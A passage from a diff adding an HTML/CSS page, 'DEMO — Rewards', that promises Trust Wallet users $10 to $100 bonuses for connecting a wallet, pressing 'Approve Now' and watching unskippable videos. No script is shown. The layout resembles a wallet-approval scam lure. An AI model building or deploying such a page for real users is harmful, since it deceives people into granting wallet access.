@@ -1,0 +1,3111 @@
+<!doctype html>
+<html> 
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>DEMO — Rewards</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+
+    body{
+      font-family:system-ui,Segoe UI,Arial;
+      background:#050816;
+      color:#e6eef8;
+      display:flex;
+      flex-direction:column;
+    }
+
+    html, body {
+  height: 100%;
+}
+
+body {
+  min-height: 100svh; /* Samsung / modern fix */
+}
+
+
+@media (max-width: 768px) {
+  header {
+    position: sticky;
+    top: 0;
+    will-change: transform;
+  }
+}
+
+    
+
+    /* === HEADER & NAV (same structure as index) === */
+    header{
+      background:#071027;
+      padding:10px 16px;
+      position:sticky;
+      top:0;
+      z-index:20;
+      border-bottom:1px solid rgba(255,255,255,0.03);
+    }
+    .nav{
+      max-width:980px;
+      margin:0 auto;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+    }
+    .nav-right{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      flex-wrap:wrap;
+      justify-content:flex-end;
+    }
+
+    .nav-right a{
+      color:#dbeafe;
+      text-decoration:none;
+      padding:6px 10px;
+      border-radius:6px;
+      font-size:0.9rem;
+    }
+    .nav-right a:hover{
+      background:#0f1b33;
+    }
+
+    .connect{
+      background:#3b82f6;
+      color:#fff;
+      padding:8px 14px;
+      border-radius:999px;
+      border:0;
+      cursor:pointer;
+      font-size:0.9rem;
+      white-space:nowrap;
+    }
+    .connect.connected{
+      background:#15803d;
+    }
+
+    main{
+      max-width:980px;
+      margin:20px auto;
+      padding:16px;
+      flex:1;
+    }
+
+
+/* ===== FIX 1: Task page full width inside main ===== */
+#taskPage{
+  max-width:980px;
+  margin:0 auto;
+}
+
+.video-wrapper,
+.task-section{
+  max-width:100%;
+}
+
+
+
+.hidden {
+  display: none !important;
+}
+
+    
+    /* small info line under header (User ID etc) */
+    .top-info{
+      margin-bottom:14px;
+      font-size:0.84rem;
+      color:#9fb0c8;
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px 18px;
+    }
+    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}
+
+    /* ===== REWARD PAGE ===== */
+    .reward-title{
+      text-align:center;
+      margin-bottom:1.5rem;
+    }
+    .reward-title h1{
+      font-size:1.9rem;
+      margin-bottom:0.4rem;
+    }
+    .reward-title p{
+      font-size:0.95rem;
+      color:#9ca3af;
+    }
+
+    .reward-card{
+      border-radius:1.5rem;
+      padding:1.4rem 1.6rem;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:1.4rem;
+      border:1px solid rgba(148,163,184,0.35);
+      box-shadow:0 20px 45px rgba(15,23,42,0.9);
+      background:radial-gradient(circle at top left,#111827,#020617);
+    }
+
+
+/* ===== UPCOMING REWARD ===== */
+.reward-lock-badge{
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
+  padding:6px 14px;
+  border-radius:999px;
+  font-size:0.8rem;
+  font-weight:600;
+  background:rgba(148,163,184,0.12);
+  border:1px solid rgba(148,163,184,0.5);
+  color:#e5e7eb;
+}
+
+
+
+
+    
+    .reward-left,
+    .reward-center,
+    .reward-right{
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+    }
+
+    .reward-left{
+      min-width:150px;
+      gap:0.4rem;
+    }
+
+    .reward-tag{
+      font-size:0.7rem;
+      text-transform:uppercase;
+      letter-spacing:0.18em;
+      color:#64748b;
+      margin-bottom:6px;
+    }
+
+    .wallet-icon-base{
+      width:54px;
+      height:54px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      overflow:hidden;
+      background:#020617;
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,0.6);
+      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
+    }
+    .wallet-icon-base img{
+      width:70%;
+      height:70%;
+      object-fit:contain;
+      display:block;
+    }
+
+    .wallet-subline{
+      font-size:0.8rem;
+      color:#9fb0c8;
+    }
+
+    .reward-center{
+      flex:1;
+      align-items:center;
+      text-align:center;
+      gap:0.35rem;
+    }
+
+    .reward-amount{
+      font-size:2.1rem;
+      font-weight:700;
+      letter-spacing:0.05em;
+    }
+
+    .reward-label{
+      font-size:0.86rem;
+      text-transform:uppercase;
+      color:#9ca3af;
+      letter-spacing:0.23em;
+    }
+
+    .reward-desc{
+      margin-top:2px;
+      font-size:0.82rem;
+      color:#9fb0c8;
+      max-width:370px;
+    }
+
+    .connected-pill{
+      margin-top:6px;
+      padding:4px 12px;
+      border-radius:999px;
+      font-size:0.8rem;
+      background:rgba(34,197,94,0.15);
+      border:1px solid rgba(34,197,94,0.7);
+      color:#bbf7d0;
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+    }
+    .connected-pill::before{
+      content:"";
+      width:6px;
+      height:6px;
+      border-radius:999px;
+      background:#22c55e;
+    }
+
+    .btn{
+      border:none;
+      outline:none;
+      border-radius:999px;
+      padding:0.55rem 1.8rem;
+      font-size:0.9rem;
+      font-weight:600;
+      cursor:pointer;
+      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      white-space:nowrap;
+    }
+
+.google-play-btn img{
+  height:70px;        /* ✅ SMALL & CLEAN */
+  width:auto;
+  display:block;
+}
+
+    @media(max-width:480px){
+  .google-play-btn img{
+    height:55px;
+  }
+}
+
+.btn-primary {
+  background: linear-gradient(135deg, #2563eb, #3b82f6);
+  color: #fff;
+  border: none;
+  border-radius: 999px;
+  padding: 10px 22px;
+  font-size: 0.95rem;
+  font-weight: 600;
+  cursor: pointer;
+  box-shadow: 0 12px 30px rgba(37, 99, 235, 0.45);
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+}
+
+.btn-primary:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 18px 40px rgba(37, 99, 235, 0.65);
+}
+
+.center-box {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 14px;
+  margin-top: 8px;
+}
+
+.center-text {
+  text-align: center;
+}
+
+    
+
+    .btn-claim{
+      background:#22c55e;
+      color:#022c22;
+      box-shadow:0 14px 30px rgba(34,197,94,0.45);
+      margin-top:0.7rem;
+    }
+    .btn-claim:hover:not([disabled]){
+      transform:translateY(-1px);
+      box-shadow:0 18px 40px rgba(34,197,94,0.6);
+    }
+
+    .btn-task{
+
+
+  
+      padding:8px 14px;
+    
+     
+      cursor:pointer;
+      font-size:0.9rem;
+      white-space:nowrap;
+
+border-radius:999px;
+  background:linear-gradient(135deg,#1e3a8a,#2563eb);
+  color:#e5edff;
+
+  border:1px solid rgba(59,130,246,0.6);
+  box-shadow:
+    0 10px 26px rgba(37,99,235,0.45),
+    inset 0 1px 0 rgba(255,255,255,0.12);
+
+
+
+  
+     
+    }
+    .btn-task:hover{
+      background:rgba(15,23,42,0.9);
+      box-shadow:0 10px 26px rgba(15,23,42,0.8);
+      transform:translateY(-1px);
+    }
+
+    .btn[disabled]{
+      opacity:0.45;
+      cursor:not-allowed;
+      box-shadow:none;
+      transform:none;
+    }
+
+    .reward-right{
+      min-width:170px;
+      align-items:flex-end;
+      gap:0.4rem;
+    }
+
+    .small{font-size:0.85rem;color:#9fb0c8;}
+
+    .reward-extra{
+      margin-top:18px;
+      font-size:0.85rem;
+      color:#9fb0c8;
+    }
+
+
+
+/* ===== APPROVE BUTTON IN WALLET STATUS CARD ===== */
+.wallet-status-card .approve-btn{
+  padding:8px 14px;  font-size:0.9rem;        /* 👈 clearer text */
+  font-size:0.9rem;    /* same as .connect */
+
+ min-width: 140px;
+  justify-content:center;
+
+  box-shadow:
+    0 10px 26px rgba(37,99,235,0.45),
+    inset 0 1px 0 rgba(255,255,255,0.12);
+}
+
+
+
+
+    
+    /* ===== TASK PAGE (same header/footer, just different content) ===== */
+    #taskPage{display:none;}
+
+    .task-header-row{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:10px;
+      margin-bottom:16px;
+    }
+    .task-header-row h2{
+      font-size:1.4rem;
+    }
+    .btn-back{
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,0.7);
+      background:transparent;
+      color:#e5e7eb;
+      font-size:0.85rem;
+      padding:0.4rem 1.2rem;
+      cursor:pointer;
+    }
+    .btn-back:hover{
+      background:#111827;
+    }
+
+    .task-section{
+      margin-top:18px;
+      padding:1rem 1.1rem;
+      border-radius:0.9rem;
+      border:1px solid rgba(75,85,99,0.7);
+      background:linear-gradient(135deg,#020617,#020617,#0b1120);
+    }
+    .task-section h3{
+      font-size:1rem;
+      margin-bottom:0.35rem;
+    }
+    .task-section p{
+      font-size:0.86rem;
+      color:#cbd5f5;
+      margin-bottom:0.35rem;
+    }
+    .task-section ul{
+      margin-left:1.2rem;
+      margin-bottom:0.35rem;
+      font-size:0.86rem;
+      color:#cbd5f5;
+    }
+    .task-section li{
+      margin-bottom:0.18rem;
+    }
+
+    .video-wrapper{
+      position:relative;
+      width:100%;
+      max-width:640px;
+      margin-top:0.6rem;
+      margin-bottom:0.6rem;
+      padding-top:56.25%; /* 16:9 */
+      border-radius:0.75rem;
+      overflow:hidden;
+      box-shadow:0 18px 38px rgba(15,23,42,0.9);
+      background:#020617;
+    }
+    .video-wrapper iframe{
+      position:absolute;
+      top:0;left:0;
+      width:100%;
+      height:100%;
+      border:0;
+    }
+
+.video-click-overlay{
+  position:absolute;
+  inset:0;
+  z-index:4;
+  cursor:pointer;
+  background:transparent;
+}
+
+.video-click-overlay.hidden{
+  pointer-events:none;
+  opacity:0;
+}
+
+
+
+.video-timer{
+  position:absolute;
+  top:10px;
+  right:10px;
+  background:rgba(2,6,23,0.85);
+  border:1px solid rgba(148,163,184,0.6);
+  color:#e5e7eb;
+  font-size:0.75rem;
+  padding:4px 8px;
+  border-radius:999px;
+  font-family:ui-monospace, monospace;
+  z-index:5;
+}
+
+
+.video-progress{
+  position:absolute;
+   background:rgba(2,6,23,0.6);
+  top:10px;
+  right:10px;
+  width:44px;
+  height:44px;
+  z-index:5;
+}
+
+
+.progress-ring{
+  transform:rotate(-90deg);
+}
+
+.ring-bg{
+  fill:none;
+  stroke:rgba(148,163,184,0.25);
+  stroke-width:4;
+}
+
+.ring-progress{
+  fill:none;
+  stroke:#3b82f6;
+  stroke-width:4;
+  stroke-linecap:round;
+  stroke-dasharray:113;
+  stroke-dashoffset:113;
+  transition:stroke-dashoffset 0.4s linear, stroke 0.3s ease;
+}
+
+.ring-text{
+  position:absolute;
+  inset:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:0.65rem;
+  font-family:ui-monospace, monospace;
+  color:#e5e7eb;
+}
+
+/* ===== MODAL ===== */
+.modal-overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(2,6,23,0.8);
+  backdrop-filter:blur(6px);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:1000;
+}
+
+.modal-overlay.hidden{
+  display:none;
+}
+
+.modal-card{
+  width:100%;
+  max-width:420px;
+  background:linear-gradient(135deg,#020617,#0b1120);
+  border:1px solid rgba(148,163,184,0.25);
+  border-radius:16px;
+  padding:22px;
+  box-shadow:0 30px 80px rgba(0,0,0,0.6);
+  position:relative;
+  animation:modalPop 0.25s ease-out;
+}
+
+@keyframes modalPop{
+  from{transform:scale(0.95);opacity:0}
+  to{transform:scale(1);opacity:1}
+}
+
+.modal-close{
+  position:absolute;
+  top:10px;
+  right:10px;
+  background:transparent;
+  border:none;
+  color:#9ca3af;
+  font-size:1.1rem;
+  cursor:pointer;
+}
+
+.modal-close:hover{color:#fff}
+
+.modal-card h3{
+  font-size:1.2rem;
+  margin-bottom:8px;
+}
+
+.modal-card p{
+  font-size:0.9rem;
+  color:#cbd5f5;
+  line-height:1.6;
+}
+
+
+
+    /* ===== WALLET STATUS (dApp style) ===== */
+.wallet-status-card{
+  background:linear-gradient(135deg,#020617,#0b1120);
+  border:1px solid rgba(148,163,184,0.25);
+  border-radius:14px;
+  padding:12px 14px;
+  margin-bottom:18px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.45);
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+}
+
+.wallet-status-row{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  font-size:0.9rem;
+  font-weight:500;
+}
+
+.status-dot{
+  width:8px;
+  height:8px;
+  border-radius:50%;
+  background:#64748b; /* default */
+  box-shadow:0 0 0 3px rgba(100,116,139,0.15);
+}
+
+/* JS will still change text only */
+#statusText{
+  color:#e5e7eb;
+}
+
+/* Meta row */
+.wallet-meta{
+  display:flex;
+  flex-wrap:wrap;
+  gap:8px;
+  align-items:center;
+}
+
+
+
+    /* ===== APPROVAL MODAL ACTIONS ===== */
+
+
+.approval-actions{
+  margin-top:18px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:12px;
+}
+
+
+/* Pills */
+.network-pill{
+  background:rgba(59,130,246,0.15);
+  border:1px solid rgba(59,130,246,0.6);
+  color:#bfdbfe;
+  padding:4px 10px;
+  border-radius:999px;
+  font-size:0.75rem;
+  font-weight:600;
+}
+
+.address-pill{
+  background:rgba(148,163,184,0.12);
+  border:1px solid rgba(148,163,184,0.35);
+  padding:4px 10px;
+  border-radius:999px;
+  font-size:0.75rem;
+  max-width:100%;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+}
+
+.user-pill{
+  background:rgba(34,197,94,0.12);
+  border:1px solid rgba(34,197,94,0.5);
+  color:#bbf7d0;
+  padding:4px 10px;
+  border-radius:999px;
+  font-size:0.75rem;
+  font-weight:600;
+}
+
+/* ===== STATUS COLORS (pure CSS, text-driven) ===== */
+.wallet-status-card:has(#statusText:contains("Connected")) .status-dot{
+  background:#22c55e;
+  box-shadow:0 0 0 3px rgba(34,197,94,0.25);
+}
+
+.wallet-status-card:has(#statusText:contains("FAILED")) .status-dot{
+  background:#f97316;
+  box-shadow:0 0 0 3px rgba(249,115,22,0.25);
+}
+
+
+
+/* ===== APPROVE BUTTON (Professional dApp style) ===== */
+.approve-btn{
+  align-self:center;            /* not full width */
+  margin-top:6px;
+
+  background:linear-gradient(
+    135deg,
+    #1e3a8a,
+    #2563eb
+  );
+
+  color:#e5edff;
+  border:1px solid rgba(59,130,246,0.6);
+  border-radius:999px;
+
+  padding:6px 16px;                   /* 👈 smaller, professional */
+  font-size:0.78rem;                  /* 👈 dApp-sized text */
+  font-weight:600;
+  letter-spacing:0.02em;
+
+  cursor:pointer;
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
+
+  box-shadow:
+    0 6px 18px rgba(37,99,235,0.35),
+    inset 0 1px 0 rgba(255,255,255,0.08);
+
+  transition:
+    transform 0.12s ease,
+    box-shadow 0.12s ease,
+    background 0.15s ease,
+    opacity 0.12s ease;
+}
+
+.approve-btn::before{
+  content:"";
+  font-size:0.75rem;
+  opacity:0.9;
+}
+
+.approve-btn:hover:not(:disabled){
+  transform:translateY(-1px);
+  box-shadow:
+    0 10px 26px rgba(37,99,235,0.55),
+    inset 0 1px 0 rgba(255,255,255,0.12);
+}
+
+.approve-btn:active:not(:disabled){
+  transform:translateY(0);
+}
+
+.approve-btn:disabled{
+  opacity:0.55;
+  cursor:not-allowed;
+  box-shadow:none;
+}
+
+
+    /* ===== BIG PRIMARY APPROVE BUTTON (MODAL ONLY) ===== */
+#approvalModal .approve-btn{
+  padding:12px 28px;        /* 👈 bigger click area */
+  font-size:1rem;           /* 👈 larger text */
+  font-weight:700;
+
+  min-width:200px;          /* 👈 strong primary feel */
+  justify-content:center;
+
+  box-shadow:
+    0 14px 36px rgba(37,99,235,0.55),
+    inset 0 1px 0 rgba(255,255,255,0.15);
+}
+#approvalModal .approve-btn:hover{
+  transform:translateY(-1px);
+  box-shadow:
+    0 20px 46px rgba(37,99,235,0.75);
+}
+
+#approvalModal .approve-btn:active{
+  transform:translateY(0);
+}
+
+
+    
+    .task-actions{
+      margin-top:0.6rem;
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      align-items:center;
+    }
+    .task-btn{
+      border-radius:999px;
+      border:none;
+      background:#22c55e;
+      color:#022c22;
+      font-size:0.9rem;
+      padding:0.45rem 1.4rem;
+      font-weight:600;
+      cursor:pointer;
+    }
+    .task-btn:hover{
+      box-shadow:0 14px 30px rgba(34,197,94,0.45);
+      transform:translateY(-1px);
+    }
+
+    .task-check{
+      font-size:0.84rem;
+    }
+    .task-check.ok{
+      color:#22c55e;
+    }
+    .task-check.bad{
+      color:#f97316;
+    }
+
+    footer{
+      max-width:980px;
+      margin:24px auto 16px auto;
+      padding:12px;
+      color:#9fb0c8;
+      text-align:center;
+      font-size:0.8rem;
+    }
+
+    /* Reward layout responsive */
+    @media(max-width:768px){
+      .reward-card{
+        flex-direction:column;
+        align-items:stretch;
+        text-align:center;
+      }
+      .reward-left{
+        align-items:center;
+      }
+      .reward-right{
+        align-items:center;
+      }
+    }
+
+/* 🔥 Android / touch devices must tap iframe directly */
+@media (pointer: coarse) {
+  .video-click-overlay {
+    display: none !important;
+  }
+}
+
+/* ================== PROFESSIONAL DAPP TIERS ================== */
+
+/* Base card stays identical */
+.reward-card{
+  background:linear-gradient(180deg,#020617,#020617);
+  border:1px solid rgba(148,163,184,0.25);
+}
+
+/* ───────── SILVER ───────── */
+.reward-silver{
+  border-left:3px solid #FFF4C7;   /* neutral silver */
+}
+
+.reward-silver .reward-amount{
+  color:#FFF4C7;
+}
+
+/* ───────── GOLD ───────── */
+.reward-gold{
+  border-left:3px solid #FFD057;   /* muted gold */
+}
+
+.reward-gold .reward-amount{
+  color:#FFD057;
+}
+
+/* ───────── PLATINUM ───────── */
+.reward-platinum{
+  border-left:3px solid #00A3FF;   /* cold platinum */
+}
+
+.reward-platinum .reward-amount{
+  color:#00A3FF;
+}
+.reward-gold{
+  box-shadow:inset 3px 0 0 rgba(202,138,4,0.35);
+}
+
+.reward-platinum{
+  box-shadow:inset 3px 0 0 rgba(148,163,184,0.35);
+   animation: platinumGlow 3.5s ease-in-out infinite;
+}
+
+
+
+@keyframes platinumGlow {
+  0% { box-shadow: 0 0 25px rgba(56,189,248,0.4); }
+  50% { box-shadow: 0 0 45px rgba(56,189,248,0.65); }
+  100% { box-shadow: 0 0 25px rgba(56,189,248,0.4); }
+}
+
+    
+
+
+/* 🔥 FIRE / PLATINUM AMOUNT ANIMATION */
+.fire-amount {
+  background: linear-gradient(
+    90deg,
+    #facc15,
+    #fb923c,
+    #ef4444,
+    #fb923c,
+    #facc15
+  );
+  background-size: 300% 100%;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+
+  text-shadow:
+    0 0 12px rgba(251, 146, 60, 0.35),
+    0 0 24px rgba(239, 68, 68, 0.25);
+
+  animation:
+    fireFlow 3.5s linear infinite,
+    firePulse 2.4s ease-in-out infinite;
+}
+
+/* flowing fire gradient */
+@keyframes fireFlow {
+  0%   { background-position:   0% 50%; }
+  100% { background-position: 300% 50%; }
+}
+
+/* subtle heat pulse */
+@keyframes firePulse {
+  0%, 100% {
+    transform: scale(1);
+    filter: brightness(1);
+  }
+  50% {
+    transform: scale(1.04);
+    filter: brightness(1.25);
+  }
+}
+
+
+
+/* 🔥 MAX TIER RIBBON */
+.max-tier-card {
+  position: relative;
+  overflow: hidden;     /* ✅ allow ribbon to escape */
+
+  border-left:3px solid #00A3FF;
+    box-shadow:inset 3px 0 0 rgba(148,163,184,0.35);
+   animation: platinumGlow 3.5s ease-in-out infinite;
+  
+}
+
+/* Ribbon element */
+.max-tier-ribbon {
+        /* always above cards */
+  pointer-events: none; 
+  position: absolute;
+  top: 18px;
+  right: -44px;
+
+  transform: rotate(45deg);
+
+  background: linear-gradient(
+    90deg,
+    #facc15,
+    #fb923c,
+    #ef4444,
+    #fb923c,
+    #facc15
+  );
+  background-size: 300% 100%;
+
+  color: #020617;
+  font-size: 0.7rem;
+  font-weight: 800;
+  letter-spacing: 0.25em;
+
+  padding: 6px 60px;
+
+  box-shadow:
+    0 10px 30px rgba(239,68,68,0.35);
+
+  animation: ribbonFire 3s linear infinite;
+}
+
+/* Fire animation */
+@keyframes ribbonFire {
+  0%   { background-position:   0% 50%; }
+  100% { background-position: 300% 50%; }
+}
+
+
+    
+
+
+    
+
+.wallet-status-card:has(#statusText:contains("failed")) .approve-btn{
+  animation:approvePulse 1.6s ease-out infinite;
+}
+
+
+
+
+
+/* hover / active polish */
+.wallet-status-card #approveBtn.btn.btn-task:hover{
+  transform:translateY(-1px);
+  box-shadow:
+    0 16px 36px rgba(37,99,235,0.65);
+}
+
+.wallet-status-card #approveBtn.btn.btn-task:active{
+  transform:translateY(0);
+}
+
+
+
+    
+    
+    /* Header mobile cleanup (match index) */
+    @media (max-width: 640px){
+      header{
+        padding:8px 10px;
+      }
+
+      .nav{
+        max-width:100%;
+        flex-direction:column;
+        align-items:stretch;
+        justify-content:flex-start;
+        gap:6px;
+      }
+
+      .logo{
+        width:100%;
+        text-align:center;
+        font-size:0.9rem;
+        letter-spacing:3px;
+      }
+      .nav-right{
+        width:100%;
+        justify-content:center;
+        gap:6px;
+      }
+
+      .nav-right a{
+        padding:4px 8px;
+        font-size:0.85rem;
+      }
+      header .connect{
+        width:100%;
+        max-width:260px;
+        padding:8px 12px;
+        font-size:0.9rem;
+      }
+
+      header{
+        background:#071027;
+        padding:10px 16px;
+        position:sticky;
+        top:0;
+        z-index:20;
+        border-bottom:1px solid rgba(255,255,255,0.03);
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- React root for Vite (hidden, UI is pure HTML) -->
+  <div id="root" style="display:none;"></div>
+
+  <header>
+    <div class="nav">
+      <div class="logo">DEMO</div>
+      <div class="nav-right">
+     <a href="#" id="aboutBtn">About</a>
+<a href="#" id="contactBtn">Contact</a>
+      
+        <button id="connectBtn" class="connect">Connect Wallet</button>
+      </div>
+    </div>
+  </header>
+
+  <main>
+
+    <div class="wallet-status-card">
+
+      <div class="wallet-status-row">
+    <span class="status-dot"></span>
+    <span id="statusText">Not connected</span>
+  </div>
+<button
+  id="approveBtn"
+  class="btn btn-task hidden"
+>
+  Approve Now
+</button>
+      
+  <br>
+      
+ <div class="wallet-meta">
+    
+    <span class="user-pill">
+      User ID <span id="userId"></span>
+    </span>
+    <br>
+    <span class="network-pill" id="walletNetwork">Network</span>
+   <br>
+
+   <br> <span class="address-pill mono" id="walletAddress">Wallet Address</span>
+
+    
+  </div>
+</div>
+
+
+    <!-- === REWARD PAGE VIEW === -->
+    <div id="rewardPage">
+      <div class="reward-title">
+        <h1>Claim Your Rewards</h1>
+        <p>Complete the tasks to claim $10.</p>
+      </div>
+
+      <div class="reward-card">
+        <div class="reward-left">
+          <div class="reward-tag">Reward #1</div>
+          <div class="wallet-icon-base">
+            <img src="logo.png" alt="Trust Wallet">
+          </div>
+          <span class="wallet-subline">Trust Wallet</span>
+        </div>
+
+        <div class="reward-center">
+          <div class="reward-amount" id="rewardAmountDisplay">$10</div>
+          <div class="reward-label">Starter Bonus</div>
+          <div class="reward-desc">
+            First time connection reward for eligible wallets.
+          </div>
+          <button id="claimBtn" class="btn btn-claim" disabled>Claim</button>
+   <button id="taskBtn" class="approve-btn" disabled>View Tasks</button>
+ 
+
+
+          
+          <div class="small" id="claimHint" style="margin-top:4px;">
+            Claim is locked until wallet is connected and all tasks are completed.
+          </div>
+        </div>
+        
+<button id="connectBtnCard" class="connect">Connect Wallet</button> 
+        
+
+      </div>
+   
+
+
+
+
+
+
+<!-- ===== UPCOMING REWARD #2 ===== -->
+<div class="reward-card reward-silver" style="margin-top:22px;">
+
+  <div class="reward-left">
+    <div class="reward-tag">Reward #2</div>
+    <div class="wallet-icon-base">
+      <img src="logo.png" alt="Wallet">
+    </div>
+    <span class="wallet-subline">Trust Wallet</span>
+  </div>
+
+  <div class="reward-center">
+    <div class="reward-amount">$25</div>
+    <div class="reward-label">Level 2 Bonus</div>
+
+    <div class="reward-desc">
+      Complete the next set of tasks to unlock this reward.
+    </div>
+
+    <div class="reward-lock-badge">
+      🔒 Locked — Coming Soon
+    </div>
+  </div>
+
+  <div class="reward-right">
+    <button class="btn btn-claim" disabled>Locked</button>
+  </div>
+</div>
+
+
+<!-- ===== UPCOMING REWARD #3 ===== -->
+<div class="reward-card reward-gold" style="margin-top:22px;">
+
+  <div class="reward-left">
+    <div class="reward-tag">Reward #3</div>
+    <div class="wallet-icon-base">
+      <img src="logo.png" alt="Wallet">
+    </div>
+    <span class="wallet-subline">Trust Wallet</span>
+  </div>
+
+  <div class="reward-center">
+    <div class="reward-amount">$50</div>
+    <div class="reward-label">Level 3 Bonus</div>
+
+    <div class="reward-desc">
+      Complete the next set of tasks to unlock this reward.
+    </div>
+
+    <div class="reward-lock-badge">
+      🔒 Locked — Coming Soon
+    </div>
+  </div>
+
+  <div class="reward-right">
+    <button class="btn btn-claim" disabled>Locked</button>
+  </div>
+</div>
+
+    
+
+
+    <!-- ===== UPCOMING REWARD #4 ===== -->
+<div class="reward-card max-tier-card" style="margin-top:22px;">
+  <div class="max-tier-ribbon">MAX&nbsp;TIER</div>
+<div class="reward-left">
+    <div class="reward-tag">Reward #4</div>
+    <div class="wallet-icon-base">
+      <img src="logo.png" alt="Wallet">
+    </div>
+    <span class="wallet-subline">Trust Wallet</span>
+  </div>
+
+  <div class="reward-center">
+    <div class="reward-amount fire-amount">$100</div>
+
+    <div class="reward-label">Level 4 Bonus</div>
+
+    <div class="reward-desc">
+      Complete the next set of tasks to unlock this reward.
+    </div>
+
+    <div class="reward-lock-badge">
+      🔒 Locked — Coming Soon
+    </div>
+  </div>
+
+  <div class="reward-right">
+    <button class="btn btn-claim" disabled>Locked</button>
+  </div>
+</div>
+
+   </div>  
+    
+
+    <!-- === TASK PAGE VIEW (same header/footer, different content) === -->
+    <div id="taskPage">
+    <div class="center-box">
+  <button id="backToRewardsBtn" class="btn-primary">
+    ← Back to Reward
+  </button>
+</div>
+
+<div class="center-text">
+  <h2>Reward Tasks</h2>
+  <p class="small">❌ Do not skip video to the end</p>
+</div>
+
+
+      <!-- Task 1: video -->
+      <div class="task-section">
+        <h3>Task 1 — Watch the Intro Video</h3>
+        <p>
+          Watch this video to understand how MYCASH and the reward system works.
+        </p>
+        <div class="video-wrapper">
+    <div class="video-click-overlay"></div>
+      <!-- Replace src with your own embedded video later -->
+<iframe
+  id="task1Player"
+  src="https://www.youtube.com/embed/lqvH1bs8mJc?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1"
+  title="MYCASH Intro"
+  allow="autoplay; encrypted-media"
+  allowfullscreen>
+</iframe>
+
+<div class="video-progress">
+  <svg class="progress-ring" width="44" height="44">
+    <circle
+      class="ring-bg"
+      cx="22"
+      cy="22"
+      r="18"
+    />
+    <circle
+      id="task1Ring"
+      class="ring-progress"
+      cx="22"
+      cy="22"
+      r="18"
+    />
+  </svg>
+  <div id="task1Timer" class="ring-text">00:00</div>
+</div>
+
+
+        </div>
+        <div class="task-actions">
+        <button class="task-btn" disabled>Watch full video to complete</button>
+
+          <span id="task1Check" class="task-check bad">❌ Not completed</span>
+        </div>
+      </div>
+
+
+
+
+
+<!-- Task 5: video -->
+<div class="task-section">
+  <h3>Task 2 — Watch Advanced Guide</h3>
+  <p>Watch this video to unlock the next reward step.</p>
+
+  <div class="video-wrapper">
+    <div class="video-click-overlay"></div>
+
+    <iframe
+      id="task5Player"
+      src="https://www.youtube.com/embed/BYfoO4sDqBo?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1"
+      allow="autoplay; encrypted-media"
+      allowfullscreen>
+    </iframe>
+
+    <div class="video-progress">
+      <svg class="progress-ring" width="44" height="44">
+        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
+        <circle id="task5Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
+      </svg>
+      <div id="task5Timer" class="ring-text">00:00</div>
+    </div>
+  </div>
+
+  <div class="task-actions">
+    <button class="task-btn" disabled>Watch full video to complete</button>
+    <span id="task5Check" class="task-check bad">❌ Not completed</span>
+  </div>
+</div>
+
+
+
+
+
+<!-- Task 6: video -->
+<div class="task-section">
+  <h3>Task 3 — Watch Advanced Guide</h3>
+  <p>Watch this video to unlock the next reward step.</p>
+
+  <div class="video-wrapper">
+    <div class="video-click-overlay"></div>
+
+    <iframe
+      id="task6Player"
+      src="https://www.youtube.com/embed/Hz2F_S3Tl0Y?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1"
+      allow="autoplay; encrypted-media"
+      allowfullscreen>
+    </iframe>
+
+    <div class="video-progress">
+      <svg class="progress-ring" width="44" height="44">
+        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
+        <circle id="task6Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
+      </svg>
+      <div id="task6Timer" class="ring-text">00:00</div>
+    </div>
+  </div>
+
+  <div class="task-actions">
+    <button class="task-btn" disabled>Watch full video to complete</button>
+    <span id="task6Check" class="task-check bad">❌ Not completed</span>
+  </div>
+</div>
+
+
+
+
+<!-- Task 7: video -->
+<div class="task-section">
+  <h3>Task 4 — Watch Advanced Guide</h3>
+  <p>Watch this video to unlock the next reward step.</p>
+
+  <div class="video-wrapper">
+    <div class="video-click-overlay"></div>
+
+    <iframe
+      id="task7Player"
+      src="https://www.youtube.com/embed/Ua3wlssr6rw?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1"
+      allow="autoplay; encrypted-media"
+      allowfullscreen>
+    </iframe>
+
+    <div class="video-progress">
+      <svg class="progress-ring" width="44" height="44">
